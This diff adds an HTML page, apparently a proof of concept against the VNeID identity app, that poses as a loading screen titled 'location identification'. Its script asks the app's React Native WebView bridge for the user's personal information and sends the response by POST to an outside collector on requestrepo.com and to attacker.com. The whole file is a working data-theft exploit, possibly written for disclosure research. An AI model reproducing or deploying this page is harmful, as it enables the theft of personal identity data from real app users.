@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head><title>Định danh địa điểm</title></head>
+<body>
+<h1>Đang tải...</h1>
+<script>
+// Request user PII from VNeID native bridge
+window.ReactNativeWebView.postMessage(JSON.stringify({
+  event: "GET_USER_INFO",
+  data: {}
+}));
+
+// Receive response
+window.addEventListener('message', function(e) {
+  var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
+  if (data.event === 'ON_USER_INFO') {
+    // Exfiltrate to attacker server
+    fetch('http://9liv9n84.requestrepo.com/poc', {
+      method: 'POST',
+      body: JSON.stringify(data.data)
+    });
+  }
+});
+
+// Also listen for CustomEvent (second dispatch path)
+window.addEventListener('nativeMessage', function(e) {
+  if (e.detail && e.detail.event === 'ON_USER_INFO') {
+    fetch('https://attacker.com/collect', {
+      method: 'POST',
+      body: JSON.stringify(e.detail.data)
+    });
+  }
+});
+</script>
+</body>
+</html>
